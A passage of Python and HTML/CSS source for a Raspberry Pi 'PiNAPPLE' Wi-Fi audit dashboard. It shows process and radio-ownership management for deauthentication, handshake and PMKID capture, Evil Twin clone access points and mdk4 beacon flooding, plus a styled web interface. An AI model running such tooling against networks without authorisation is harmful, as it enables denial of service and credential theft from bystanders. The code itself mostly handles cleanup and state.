        audit('Could not restore hostapd config after Evil Twin: %s' % exc, 'error')

    try:
        subprocess.run(['systemctl', 'start', 'pinapple-ap'],
                       capture_output=True, text=True, timeout=10)
        subprocess.run(['systemctl', 'restart', 'pinapple-dhcp'],
                       capture_output=True, timeout=15)
    except Exception:
        pass
    audit('Evil Twin stopped; default AP restored' +
          (' (%s)' % reason if reason else ''))


def reconcile_eviltwin_state():
    """Recover safely if the dashboard died during an Evil Twin run.

    An Evil Twin must never outlive a reboot/restart. If its deauth helper is
    gone, restore the backed-up AP config and clean the state files.
    """
    if not os.path.exists(EVILTWIN_STATE) and not os.path.exists(EVILTWIN_BACKUP):
        return
    state = read_json_file(EVILTWIN_STATE, {})
    pid = state.get('pid')
    if pid and pid_alive(pid, 'pinapple-deauth'):
        return
    audit('Recovering from an interrupted Evil Twin run', 'warn')
    release_wlan1('eviltwin')
    restore_ap_after_eviltwin('dashboard restart')


def cleanup_orphan_handshakes():
    """Kill handshake helpers left behind by a previous dashboard process."""
    if not os.path.isdir('/proc'):
        return 0
    killed = 0
    for entry in os.listdir('/proc'):
        if not entry.isdigit():
            continue
        pid = int(entry)
        if pid == os.getpid():
            continue
        try:
            with open('/proc/%d/cmdline' % pid) as handle:
                cmdline = handle.read().replace('\x00', ' ')
        except OSError:
            continue
        if 'pinapple-handshake' in cmdline:
            try:
                os.kill(pid, signal.SIGTERM)
                killed += 1
            except OSError:
                pass
    if killed:
        audit('Cleaned up %d orphaned handshake helper(s)' % killed, 'warn')
    return killed


def cleanup_orphan_beacon():
    """Kill an mdk4 left behind when its helper was SIGKILLed."""
    if not os.path.isdir('/proc'):
        return
    proc = _beacon_proc[0]
    if proc is not None and proc.poll() is None:
        return
    details = read_json_file(BEACON_STATUS, {})
    mdk4_pid = details.get('mdk4_pid')
    if not isinstance(mdk4_pid, int) or mdk4_pid <= 1:
        return
    helper_alive = False
    try:
        with open(BEACON_PID) as handle:
            helper_alive = pid_alive(int(handle.read().strip()), 'pinapple-beacon-flood')
    except (OSError, ValueError):
        pass
    if helper_alive:
        return
    if pid_alive(mdk4_pid, 'mdk4'):
        safe_kill_pid(mdk4_pid, 'mdk4')
        audit('Killed an orphaned mdk4 beacon process', 'warn')
    for path in (BEACON_PID, BEACON_STATUS):
        try:
            os.remove(path)
        except OSError:
            pass


def watchdog_loop():
    """Keep radio ownership and job state honest even with no browser open."""
    while True:
        time.sleep(15)
        try:
            cleanup_orphan_beacon()
            reconcile_wlan1_owner()
            prune_handshake_jobs()
        except Exception:
            pass


def claim_wlan1(owner):
    """Give one feature exclusive use of wlan1."""
    with _wlan1_lock:
        # A recon/scan service would keep hopping the radio and silently
        # discard most injected frames, so pause it for the duration.
        pause_recon()
        stop_wlan1_jobs(except_owner=owner)
        _wlan1_owner[0] = owner
        _wlan1_claimed_at[0] = time.time()


def release_wlan1(owner):
    with _wlan1_lock:
        if _wlan1_owner[0] == owner:
            _wlan1_owner[0] = None
            _wlan1_claimed_at[0] = 0.0
            return True
    return False


def release_wlan1_and_restore(owner):
    """Release an owner and put wlan1 back into the user's chosen idle mode."""
    if release_wlan1(owner):
        restore_wlan1_idle()


def wlan1_owner_alive(owner):
    """Best-effort check that the tool owning wlan1 still has a process."""
    if owner == 'beacon':
        proc = _beacon_proc[0]
        if proc is not None and proc.poll() is None:
            return True
        try:
            with open(BEACON_PID) as handle:
                return pid_alive(int(handle.read().strip()), 'pinapple-beacon-flood')
        except (OSError, ValueError):
            return False
    if owner == 'deauth':
        with _jobs_lock:
            if any(job['proc'].poll() is None for job in _deauth_jobs.values()):
                return True
        try:
            with open(DEAUTH_PID) as handle:
                return pid_alive(int(handle.read().strip()), 'pinapple-deauth')
        except (OSError, ValueError):
            return False
    if owner == 'handshake':
        return any(job.get('status') == 'running' for job in list(_hs_jobs.values()))
    if owner == 'pmkid':
        proc = _pmkid_proc[0]
        if proc is not None and proc.poll() is None:
            return True
        state = read_json_file(PMKID_STATE, {})
        return bool(state.get('pid') and pid_alive(state.get('pid'), 'hcxdumptool'))
    if owner == 'eviltwin':
        proc = _evil_twin_job[0]
        if proc is not None and proc.poll() is None:
            return True
        state = read_json_file(EVILTWIN_STATE, {})
        if state.get('pid') and pid_alive(state.get('pid'), 'pinapple-deauth'):
            return True
        clone_mac = str(state.get('bssid', '')).lower()
        if (clone_mac and wlan0_mac() == clone_mac and
                service_status('pinapple-ap')):
            return True
        return False
    return False


def reconcile_wlan1_owner():
    """Release a stale owner whose process died, so the UI does not lie."""
    owner = _wlan1_owner[0]
    if not owner:
        # After a dashboard restart, in-memory ownership is gone but a helper
        # may still be transmitting. Adopt it so the UI can show and stop it.
        for label, path, marker in (
                ('beacon', BEACON_PID, 'pinapple-beacon-flood'),
                ('deauth', DEAUTH_PID, 'pinapple-deauth'),
                ('pmkid', PMKID_PID, 'hcxdumptool'),
                ('eviltwin', EVILTWIN_PID, 'pinapple-deauth')):
            try:
                with open(path) as handle:
                    pid = int(handle.read().strip())
            except (OSError, ValueError):
                continue
            if pid_alive(pid, marker):
                _wlan1_owner[0] = label
                _wlan1_claimed_at[0] = time.time()
                audit('Adopted running %s helper (pid %d)' % (label, pid), 'warn')
                return label
        twin_state = read_json_file(EVILTWIN_STATE, {})
        clone_mac = str(twin_state.get('bssid', '')).lower()
        if clone_mac and wlan0_mac() == clone_mac and service_status('pinapple-ap'):
            _wlan1_owner[0] = 'eviltwin'
            _wlan1_claimed_at[0] = time.time()
            audit('Adopted a running Evil Twin clone AP', 'warn')
            return 'eviltwin'
        return None
    # PID inspection is Linux-only; on other hosts we cannot verify liveness.
    if not os.path.isdir('/proc'):
        return owner
    # Give claim_wlan1() a moment to spawn the new helper.
    if time.time() - (_wlan1_claimed_at[0] or 0) < 8:
        return owner
    if wlan1_owner_alive(owner):
        return owner
    audit('wlan1 owner %s died; releasing the radio' % owner, 'warn')
    if owner == 'beacon':
        cleanup_orphan_beacon()
    if owner == 'eviltwin' and (os.path.exists(EVILTWIN_BACKUP) or
                                os.path.exists(EVILTWIN_STATE)):
        restore_ap_after_eviltwin('twin process died')
    release_wlan1(owner)
    restore_wlan1_idle()
    return None


RECON_SERVICE_HINTS = ('monitor', 'recon', 'scan')


def recon_service_candidates(force=False):
    """Find the recon/scan service(s) without hard-coding one unit name.

    Cached for 60 s: this is called by status polling and page renders, and a
    systemd list-units call on every request would be wasteful on a Pi.
    """
    now = time.time()
    if not force and _recon_cache['names'] and now - _recon_cache['at'] < 60:
        return list(_recon_cache['names'])
    try:
        configured = load_config().get('recon_services')
        if isinstance(configured, list) and configured:
            names = [str(name).strip() for name in configured if str(name).strip()]
            _recon_cache.update({'at': now, 'names': names})
            return list(names)
    except Exception:
        pass

    names = ['pinapple-monitor', 'pinapple-recon', 'pinapple-scan', 'pinapple-scanner']
    try:
        r = subprocess.run(
            ['systemctl', 'list-units', '--type=service', '--all', '--no-legend', '--plain'],
            capture_output=True, text=True, timeout=5)
        for line in r.stdout.splitlines():
            parts = line.split()
            if not parts:
                continue
            unit = parts[0]
            if not unit.startswith('pinapple-') or not unit.endswith('.service'):
                continue
            short = unit[:-len('.service')]
            if any(hint in short.lower() for hint in RECON_SERVICE_HINTS) and short not in names:
                names.append(short)
    except Exception:
        pass
    _recon_cache.update({'at': now, 'names': list(names)})
    return names


def pause_recon():
    """Stop recon/scan services that are actually active; remember them."""
    if _recon_paused[0]:
        return False
    _recon_paused[0] = True
    stopped = []
    for name in recon_service_candidates():
        try:
            active = subprocess.run(['systemctl', 'is-active', '--quiet', name],
                                    timeout=4).returncode == 0
            if not active:
                continue
            r = subprocess.run(['systemctl', 'stop', name], timeout=12)
            if r.returncode == 0:
                stopped.append(name)
        except Exception:
            pass
    _recon_stopped[0] = stopped
    return bool(stopped)


def resume_recon():
    """Restart exactly the recon services that pause_recon() stopped."""
    _recon_paused[0] = False
    stopped = _recon_stopped[0] or []
    _recon_stopped[0] = []
    for name in stopped:
        try:
            subprocess.run(['systemctl', 'start', name], timeout=12)
        except Exception:
            pass


def resume_recon_if_idle():
    with _wlan1_lock:
        idle = _wlan1_owner[0] is None
    if not idle:
        return
    if _recon_stopped[0]:
        resume_recon()
    else:
        _recon_paused[0] = False
        restore_wlan1_idle()


def stop_recon_now():
    """Manual override: stop recon services without arming a later resume."""
    _recon_paused[0] = False
    _recon_stopped[0] = []
    for name in recon_service_candidates():
        try:
            subprocess.run(['systemctl', 'stop', name], timeout=12)
        except Exception:
            pass


def start_recon_now():
    _recon_paused[0] = False
    _recon_stopped[0] = []
    for name in recon_service_candidates():
        try:
            subprocess.run(['systemctl', 'start', name], timeout=12)
        except Exception:
            pass


def set_monitor_service_enabled(enabled):
    """Make the monitor's boot behaviour match the chosen wlan1 mode."""
    action = 'enable' if enabled else 'disable'
    try:
        subprocess.run(['systemctl', action, 'pinapple-monitor'],
                       capture_output=True, timeout=10)
    except Exception:
        pass


NAV = """<aside class="sidebar">
  <button class="sidebar-close" onclick="toggleMenu()" aria-label="Close menu">&#10005;</button>
  <div class="sidebar-logo"><div class="logo-icon">&#127821;</div>
    <div><div class="logo-text">PiNAPPLE</div><div class="logo-sub">WiFi Audit Platform</div></div>
  </div>
  <nav style="padding:12px 0; flex:1; overflow-y:auto;">
    <div style="padding: 8px 20px; font-size: 0.7rem; color: var(--dim); text-transform: uppercase; letter-spacing: 1px;">Dashboard</div>
    <a href="/" class="{ov}">📊 Overview</a>
    <a href="/clients" class="{cl}">👥 Clients</a>
    <a href="/recon" class="{re}">📡 Recon</a>
    <a href="/creds" class="{cr}">🔑 Credentials</a>
    <a href="/saved" class="{sv}">💾 Saved</a>
    <a href="/logs" class="{lo}">📝 Logs</a>
    <a href="/ap-control" class="{ap}">📶 AP Control</a>
    <a href="/settings" class="{se}">⚙️ Settings</a>

    <div style="padding: 8px 20px; font-size: 0.7rem; color: var(--dim); text-transform: uppercase; letter-spacing: 1px; margin-top: 10px;">Wireless Tools</div>
    <a href="/wlan1?tab=deauth" class="{da}">⚡ Deauth</a>
    <a href="/wlan1?tab=handshake" class="{hs}">🖐️ Handshake</a>
    <a href="/wlan1?tab=eviltwin" class="{et}">🎭 Evil Twin</a>
    <a href="/wlan1?tab=pmkid" class="{pm}">🔑 PMKID</a>
    <a href="/wlan1?tab=beacon" class="{bf}">📡 Beacon Flood</a>
    <a href="/wlan1?tab=tracker" class="{tr}">📊 Client Tracker</a>
    <a href="/wlan1?tab=probes" class="{pr}">📶 Probe Requests</a>
  </nav>
  <div class="sidebar-footer">admin@pinapple</div>
</aside>"""

CSS = """<style>
:root{--bg:#000000;--sb:#0a0a0a;--card:#141414;--bdr:#2a2a2a;--acc:#00d4aa;--acc2:#0099ff;--danger:#ff4757;--warn:#ffa502;--txt:#ffffff;--dim:#888888;--grn:#2ed573;--red:#ff4757}
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',monospace;background:var(--bg);color:var(--txt);display:flex;min-height:100vh}
.sidebar{width:240px;background:var(--sb);border-right:1px solid var(--bdr);display:flex;flex-direction:column;position:fixed;height:100vh;overflow-y:auto;z-index:100}
.sidebar-logo{padding:24px 20px;border-bottom:1px solid var(--bdr);display:flex;align-items:center;gap:12px}
.sidebar-close{display:none;position:absolute;top:14px;right:12px;width:40px;height:40px;align-items:center;justify-content:center;border:1px solid var(--bdr);border-radius:10px;background:var(--card);color:var(--txt);font-size:1rem;cursor:pointer}
.logo-icon{width:36px;height:36px;background:var(--acc);border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:1.2rem}
.logo-text{font-weight:700;font-size:1.2rem;color:var(--acc)}.logo-sub{font-size:0.65rem;color:var(--dim)}
nav{padding:12px 0;flex:1}
nav a{display:flex;align-items:center;gap:12px;padding:10px 20px;color:var(--dim);text-decoration:none;font-size:0.875rem;transition:all 0.15s;border-left:3px solid transparent}
nav a:hover{color:var(--txt);background:rgba(0,212,170,0.08)}
nav a.active{color:var(--acc);background:rgba(0,212,170,0.1);border-left-color:var(--acc)}
.nav-icon{font-size:1rem;width:20px;text-align:center}
.sidebar-footer{padding:16px 20px;border-top:1px solid var(--bdr);font-size:0.7rem;color:var(--dim)}
.main{margin-left:240px;flex:1}
.topbar{background:var(--sb);border-bottom:1px solid var(--bdr);padding:16px 32px;display:flex;align-items:center;justify-content:space-between}
.topbar h1{font-size:1.25rem;font-weight:600}
.hamburger{display:none;background:none;border:none;color:var(--txt);font-size:1.5rem;cursor:pointer;margin-right:12px}
.gstatus{font-size:0.68rem;padding:5px 9px;border-radius:999px;border:1px solid var(--bdr);color:var(--dim);white-space:nowrap;cursor:pointer;max-width:42vw;overflow:hidden;text-overflow:ellipsis;margin-left:10px;flex:none;min-height:30px;display:inline-flex;align-items:center}
.gstatus.busy{color:var(--grn);border-color:rgba(46,213,115,0.45);animation:pulse 2s infinite}
.gstatus.err{color:var(--red);border-color:rgba(255,71,87,0.5)}
.topbar h1{flex:1;min-width:0}
.content{padding:24px 32px;max-width:1500px;margin:0 auto;width:100%}
.cards{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:16px;margin-bottom:24px}
.card{background:var(--card);border:1px solid var(--bdr);border-radius:12px;padding:20px;position:relative;overflow:hidden}
.card::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--acc),var(--acc2))}
.card-title{font-size:0.75rem;color:var(--dim);text-transform:uppercase;letter-spacing:1px;margin-bottom:8px}
.card-value{font-size:2rem;font-weight:700;color:var(--acc)}
.card-sub{font-size:0.75rem;color:var(--dim);margin-top:4px}
.card-link{display:block;color:inherit;text-decoration:none;transition:border-color .15s}
.card-link:hover{border-color:var(--acc)}
.sdot{display:inline-block;width:10px;height:10px;border-radius:50%;margin-right:8px}
.sdot.on{background:var(--grn);box-shadow:0 0 8px var(--grn);animation:pulse 2s infinite}
.sdot.off{background:var(--red)}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:0.5}}
.scrd{display:flex;align-items:center}
.btn{display:inline-flex;align-items:center;gap:8px;padding:8px 16px;border:none;border-radius:8px;cursor:pointer;font-size:0.875rem;font-weight:500;transition:all 0.15s;text-decoration:none}
.btn-acc{background:var(--acc);color:#000}.btn-acc:hover{background:#00b896}
.btn-danger{background:var(--danger);color:white}.btn-danger:hover{background:#cc3a47}
.btn-outline{background:transparent;border:1px solid var(--bdr);color:var(--txt)}.btn-outline:hover{border-color:var(--acc);color:var(--acc)}
.tbtn{padding:6px 14px;border-radius:20px;border:none;cursor:pointer;font-size:0.8rem;font-weight:600;transition:all 0.2s}
.tbtn:disabled{opacity:0.5;cursor:not-allowed}
.ton{background:var(--grn);color:#000}.toff{background:var(--bdr);color:var(--dim)}
table{width:100%;border-collapse:collapse}
th{padding:12px 16px;text-align:left;font-size:0.75rem;color:var(--dim);text-transform:uppercase;letter-spacing:1px;border-bottom:1px solid var(--bdr)}
td{padding:12px 16px;font-size:0.875rem;border-bottom:1px solid rgba(42,42,74,0.5)}
tr:hover td{background:rgba(0,212,170,0.03)}
.twrap{background:var(--card);border:1px solid var(--bdr);border-radius:12px;overflow-x:auto;}
.sh{display:flex;align-items:center;justify-content:space-between;margin-bottom:16px;flex-wrap:wrap;gap:8px;}
.st{font-size:0.9rem;font-weight:600;color:var(--txt)}
.badge{padding:2px 8px;border-radius:4px;font-size:0.7rem;font-weight:600}
.bg{background:rgba(46,213,115,0.15);color:var(--grn)}.br{background:rgba(255,71,87,0.15);color:var(--red)}
.bb{background:rgba(0,153,255,0.15);color:var(--acc2)}.bw{background:rgba(255,165,2,0.15);color:var(--warn)}
.fr{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:16px;margin-bottom:16px}
.fg{display:flex;flex-direction:column;gap:6px}
.fg label{font-size:0.8rem;color:var(--dim);text-transform:uppercase;letter-spacing:0.5px}
.fg input,.fg select{background:var(--bg);border:1px solid var(--bdr);color:var(--txt);padding:10px 14px;border-radius:8px;font-size:0.875rem;outline:none;width:100%;}
.fg input:focus,.fg select:focus{border-color:var(--acc)}
select{background:var(--bg);border:1px solid var(--bdr);color:var(--txt);padding:9px 12px;border-radius:8px;font-size:0.85rem;outline:none;max-width:100%}
select:focus{border-color:var(--acc)}
input[type=file]{color:var(--txt);font-size:0.82rem}
input[type=file]::file-selector-button{background:var(--card);color:var(--txt);border:1px solid var(--bdr);border-radius:8px;padding:8px 12px;margin-right:10px;cursor:pointer}
input[type=range]{accent-color:var(--acc)}
input[type=radio],input[type=checkbox]{accent-color:var(--acc)}
.log-area{background:#050510;border:1px solid var(--bdr);border-radius:8px;padding:16px;font-family:monospace;font-size:0.8rem;height:500px;overflow-y:auto;white-space:pre-wrap;word-break:break-all}
.le{color:var(--red)}.lw{color:var(--warn)}.li{color:var(--txt)}.ld{color:var(--dim)}
.tg{display:flex;align-items:center;gap:16px;padding:16px;background:var(--card);border:1px solid var(--bdr);border-radius:12px;margin-bottom:12px}
.tl{flex:1}.tl strong{display:block;font-size:0.9rem}.tl span{font-size:0.75rem;color:var(--dim)}
.tabs{display:flex;flex-wrap:wrap;gap:8px;margin-bottom:16px;border-bottom:1px solid var(--bdr);padding-bottom:12px}

/* Beacon flood: mobile-first control surface */
.bf-wrap{max-width:1080px;margin:0 auto}
.bf-head{display:flex;align-items:flex-start;justify-content:space-between;gap:12px;margin-bottom:16px;flex-wrap:wrap}
.bf-eyebrow{font-size:0.68rem;font-weight:700;letter-spacing:0.12em;text-transform:uppercase;color:var(--acc)}
.bf-title{font-size:1.35rem;line-height:1.2;margin-top:4px}
.bf-sub{font-size:0.84rem;color:var(--dim);line-height:1.5;max-width:62ch;margin-top:6px}
.bf-lab{font-size:0.7rem;color:var(--warn);border:1px solid rgba(255,165,2,0.35);background:rgba(255,165,2,0.08);padding:6px 10px;border-radius:999px;white-space:nowrap}
.bf-live{display:flex;align-items:center;gap:12px;padding:14px 16px;border:1px solid var(--bdr);border-radius:14px;background:linear-gradient(135deg,rgba(20,20,20,1),rgba(10,10,10,1));margin-bottom:16px;flex-wrap:wrap;transition:border-color .2s,box-shadow .2s}
.bf-live.is-running{border-color:rgba(46,213,115,0.55);box-shadow:0 0 0 1px rgba(46,213,115,0.12),0 8px 30px rgba(0,0,0,0.25)}
.bf-live.is-error{border-color:rgba(255,71,87,0.6);box-shadow:0 0 0 1px rgba(255,71,87,0.12)}
.bf-dot{width:12px;height:12px;border-radius:50%;background:var(--dim);flex:none;transition:background .2s}
.bf-live.is-running .bf-dot{background:var(--grn);box-shadow:0 0 0 5px rgba(46,213,115,0.14);animation:pulse 1.6s infinite}
.bf-live.is-error .bf-dot{background:var(--red)}
.bf-live-copy{display:flex;flex-direction:column;gap:2px;min-width:0;flex:1}
.bf-live-copy strong{font-size:0.95rem}
.bf-live-copy span{font-size:0.76rem;color:var(--dim);overflow-wrap:anywhere}
.bf-live-meta{display:flex;gap:6px;flex-wrap:wrap}
.bf-chip{font-size:0.7rem;color:var(--dim);background:rgba(255,255,255,0.04);border:1px solid var(--bdr);padding:5px 9px;border-radius:999px;white-space:nowrap}
.bf-chip strong{color:var(--txt);font-weight:600}
.bf-grid{display:grid;grid-template-columns:minmax(0,1.05fr) minmax(0,0.95fr);gap:16px;align-items:start}
.bf-card{overflow:visible}
.bf-label{display:block;font-size:0.72rem;color:var(--dim);text-transform:uppercase;letter-spacing:0.07em;margin:16px 0 8px}
.bf-input{width:100%;font-size:16px;padding:14px;border-radius:12px;border:1px solid var(--bdr);background:var(--bg);color:var(--txt);outline:none}
.bf-input:focus{border-color:var(--acc);box-shadow:0 0 0 3px rgba(0,212,170,0.1)}
.bf-hint{font-size:0.74rem;color:var(--dim);line-height:1.45;margin-top:8px}
.bf-stepper{display:grid;grid-template-columns:52px minmax(0,1fr) 52px;gap:8px}
.bf-stepper button{min-height:52px;border-radius:12px;border:1px solid var(--bdr);background:var(--bg);color:var(--txt);font-size:1.4rem;cursor:pointer}
.bf-stepper button:active{background:rgba(0,212,170,0.12);border-color:var(--acc)}
.bf-stepper input{text-align:center;font-size:1.25rem;font-weight:700;min-height:52px;padding:10px;border-radius:12px;border:1px solid var(--bdr);background:var(--bg);color:var(--txt);outline:none;width:100%}
.bf-stepper input:focus{border-color:var(--acc)}
.bf-advanced{margin-top:16px;border-top:1px solid var(--bdr);padding-top:12px}
.bf-advanced summary{cursor:pointer;font-size:0.8rem;color:var(--dim);list-style:none}
.bf-advanced summary::-webkit-details-marker{display:none}
.bf-advanced summary::before{content:'▸ ';color:var(--acc)}
.bf-advanced[open] summary::before{content:'▾ '}
.bf-adv-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-top:12px}
.bf-adv-grid label{display:flex;flex-direction:column;gap:6px;font-size:0.7rem;color:var(--dim);text-transform:uppercase;letter-spacing:0.05em}
.bf-adv-grid input{font-size:16px;padding:11px;border-radius:10px;border:1px solid var(--bdr);background:var(--bg);color:var(--txt);outline:none;width:100%}
.bf-adv-grid input:focus{border-color:var(--acc)}
.bf-actions{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-top:20px}
.bf-start,.bf-stop{min-height:54px;justify-content:center;font-size:0.95rem;font-weight:700;border-radius:12px}
.bf-start{background:linear-gradient(135deg,var(--acc),#00a88a);color:#00110d}
.bf-start:hover{filter:brightness(1.05)}
.bf-start:disabled{opacity:0.45;cursor:not-allowed}
.bf-stop{background:transparent;border:1px solid rgba(255,71,87,0.55);color:var(--red)}
.bf-stop:hover{background:rgba(255,71,87,0.08)}
.bf-stop:disabled{opacity:0.35;cursor:not-allowed}
.bf-error{display:none;margin-top:12px;padding:10px 12px;border-radius:10px;background:rgba(255,71,87,0.1);border:1px solid rgba(255,71,87,0.35);color:var(--red);font-size:0.8rem;line-height:1.45;overflow-wrap:anywhere}
.bf-stat-grid{display:grid;grid-template-columns:repeat(2,minmax(0,1fr));gap:10px;margin-top:4px}
.bf-stat-grid>div{background:var(--bg);border:1px solid var(--bdr);border-radius:12px;padding:12px;display:flex;flex-direction:column;gap:2px;min-width:0}
.bf-stat-grid span{font-size:1.35rem;font-weight:700;color:var(--acc);font-variant-numeric:tabular-nums;overflow-wrap:anywhere}
.bf-stat-grid small{font-size:0.66rem;color:var(--dim);text-transform:uppercase;letter-spacing:0.06em}
.bf-badges{display:flex;flex-wrap:wrap;gap:6px;margin-top:14px;max-height:190px;overflow:auto;padding-right:2px}
.bf-badges .badge{font-size:0.68rem;padding:4px 8px;overflow-wrap:anywhere}
.bf-log{display:none;margin-top:12px;border-top:1px solid var(--bdr);padding-top:10px;font-family:monospace;font-size:0.7rem;line-height:1.45;color:var(--dim);white-space:pre-wrap;max-height:120px;overflow:auto;overflow-wrap:anywhere}
.bf-empty{font-size:0.76rem;color:var(--dim);line-height:1.5;margin-top:12px}

/* --- shared feedback, tabs, status --- */
.toasts{position:fixed;left:50%;transform:translateX(-50%);bottom:calc(16px + env(safe-area-inset-bottom));z-index:9999;display:flex;flex-direction:column;gap:8px;width:min(92vw,440px);pointer-events:none}
.toast{background:#1b1b1b;border:1px solid var(--bdr);color:var(--txt);padding:12px 14px;border-radius:12px;font-size:0.85rem;line-height:1.4;box-shadow:0 10px 30px rgba(0,0,0,0.45);opacity:1;transform:translateY(0);transition:opacity .2s,transform .2s;pointer-events:auto;overflow-wrap:anywhere}
.toast.success{border-color:rgba(46,213,115,0.5);background:rgba(46,213,115,0.12)}
.toast.error{border-color:rgba(255,71,87,0.55);background:rgba(255,71,87,0.12)}
.toast.warn{border-color:rgba(255,165,2,0.5);background:rgba(255,165,2,0.1)}
.toast.out{opacity:0;transform:translateY(8px)}
.wl-modebar{display:flex;align-items:center;gap:10px;flex-wrap:wrap;padding:10px 12px;border:1px solid var(--bdr);border-radius:12px;background:var(--card);margin-bottom:12px;font-size:0.82rem}
.wl-modebar .wl-owner{font-size:0.7rem;color:var(--warn)}
.wl-tabs{display:flex;gap:8px;overflow-x:auto;padding:2px 0 12px;margin-bottom:14px;border-bottom:1px solid var(--bdr);-webkit-overflow-scrolling:touch;scrollbar-width:none}
.wl-tabs::-webkit-scrollbar{display:none}
.wl-tab{flex:0 0 auto;padding:9px 14px;border-radius:999px;border:1px solid var(--bdr);background:var(--card);color:var(--dim);text-decoration:none;font-size:0.82rem;font-weight:600;white-space:nowrap}
.wl-tab.active{background:rgba(0,212,170,0.14);border-color:var(--acc);color:var(--acc)}
.wl-pane{display:none}
.status-card{display:flex;align-items:center;gap:12px;padding:12px 14px;border:1px solid var(--bdr);border-radius:12px;background:var(--card);margin:12px 0;flex-wrap:wrap}
.status-card .dot{width:11px;height:11px;border-radius:50%;background:var(--dim);flex:none}
.status-card.on .dot{background:var(--grn);box-shadow:0 0 0 4px rgba(46,213,115,0.14);animation:pulse 1.6s infinite}
.status-card.err .dot{background:var(--red)}
.status-card .sc-copy{flex:1;min-width:0}
.status-card strong{display:block;font-size:0.9rem}
.status-card span{font-size:0.76rem;color:var(--dim);overflow-wrap:anywhere}
.status-card .sc-meta{font-size:0.72rem;color:var(--dim)}
.grid2{display:grid;grid-template-columns:repeat(2,minmax(0,1fr));gap:12px}
.hint{font-size:0.76rem;color:var(--dim);line-height:1.5;margin-top:6px}
.warnbox{padding:10px 12px;border-radius:10px;border:1px solid rgba(255,165,2,0.35);background:rgba(255,165,2,0.08);color:var(--warn);font-size:0.78rem;line-height:1.45;margin:10px 0}
.btn:disabled{opacity:0.5;cursor:not-allowed}
.btn-block{width:100%;justify-content:center}
.scan-tbody .btn{min-height:40px;padding:8px 14px}
.spin{display:inline-block;width:14px;height:14px;border:2px solid currentColor;border-right-color:transparent;border-radius:50%;animation:spin .7s linear infinite;vertical-align:-2px;margin-right:6px}
@keyframes spin{to{transform:rotate(360deg)}}

@media (max-width: 860px) {
  .bf-grid{grid-template-columns:1fr;}
  .bf-live-meta{margin-left:0;width:100%}
}
@media (max-width: 480px) {
  .bf-title{font-size:1.15rem}
  .bf-adv-grid{grid-template-columns:1fr}
  .bf-actions{grid-template-columns:1fr}
  .bf-lab{width:100%;text-align:center}
  .bf-stat-grid span{font-size:1.2rem}
}

@media (max-width: 768px) {
  body{-webkit-text-size-adjust:100%}
  .sidebar{width:min(86vw,330px);transform:translateX(-100%);transition:transform 0.25s ease-in-out;display:flex;}
  .sidebar.open{transform:translateX(0);}
  .sidebar-close{display:inline-flex;}
  .main{margin-left:0;}
  .topbar{position:sticky;top:0;z-index:80;padding:12px 16px;gap:8px;}
  .topbar h1{font-size:1.05rem;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
  .topbar #clk{display:none;}
  .content{padding:14px 14px calc(80px + env(safe-area-inset-bottom));}
  .cards{grid-template-columns:repeat(2,minmax(0,1fr));gap:12px;}
  .fr,.grid2{grid-template-columns:1fr;}
  input,select,textarea{font-size:16px !important;}
  .btn{min-height:46px;padding:10px 16px;}
  .tbtn{min-height:42px;min-width:64px;}
  .tabs{flex-wrap:nowrap;overflow-x:auto;padding-bottom:10px;}
  .tabs .btn{width:auto;flex:0 0 auto;justify-content:center;}
  .tg{flex-direction:row;text-align:left;gap:12px;}
  .tg .tbtn{margin-left:auto;}
  nav a{padding:14px 20px;font-size:0.95rem;min-height:48px;}
  .sidebar-overlay{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.55);z-index:99;}
  .sidebar.open + .sidebar-overlay{display:block;}
  .hamburger{display:inline-flex;align-items:center;justify-content:center;min-width:44px;min-height:44px;}
  .log-area{height:62vh;font-size:0.72rem;}
  .twrap{background:transparent;border:none;overflow:visible;}
  table.resp thead{display:none;}
  table.resp,table.resp tbody,table.resp tr,table.resp td{display:block;width:100%;}
  table.resp tr{border:1px solid var(--bdr);border-radius:12px;margin:0 0 10px;padding:5px 0;background:var(--card);}
  table.resp td{display:flex;align-items:baseline;justify-content:space-between;gap:14px;border:none;padding:7px 12px;text-align:right;font-size:0.82rem;word-break:break-word;}
  table.resp td::before{content:attr(data-label);color:var(--dim);font-size:0.68rem;text-transform:uppercase;letter-spacing:0.06em;text-align:left;flex:0 0 38%;}
  table.resp td[colspan]{display:block;text-align:center;}
  table.resp td[colspan]::before{content:'';}
  .wl-tab{padding:11px 16px;font-size:0.86rem;}
  .status-card{padding:11px 12px;}
}
@media (max-width: 380px) {
  .cards{grid-template-columns:1fr;}
}
@media (prefers-reduced-motion: reduce){
  *,*::before,*::after{animation-duration:.01ms !important;animation-iteration-count:1 !important;transition-duration:.01ms !important}
}
</style>"""

BASE = """<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,viewport-fit=cover">
<meta name="theme-color" content="#000000">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
<meta name="mobile-web-app-capable" content="yes">
<meta name="format-detection" content="telephone=no">
<title>PiNAPPLE &mdash; {title}</title>{css}</head><body>{nav}
<div class="sidebar-overlay" onclick="toggleMenu()"></div><main class="main"><div class="topbar"><button class="hamburger" onclick="toggleMenu()" aria-label="Open menu">&#9776;</button><h1>{title}</h1>
<span id="global-status" class="gstatus" title="Radio status">wlan1</span>
<span style="font-size:0.75rem;color:var(--dim)" id="clk"></span></div>
<div class="content">{content}</div></main>
<div id="toasts" class="toasts" aria-live="polite"></div>
<script>
function uc(){{document.getElementById('clk').textContent=new Date().toLocaleString();}}
setInterval(uc,1000);uc();
function esc(v){{
  return String(v==null?'':v).replace(/[&<>"']/g,function(c){{
    return {{'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}}[c];
  }});
}}
function toast(msg,type,ms){{
  const box=document.getElementById('toasts');
  if(!box)return;
  const el=document.createElement('div');
  el.className='toast '+(type||'info');
  el.textContent=msg;
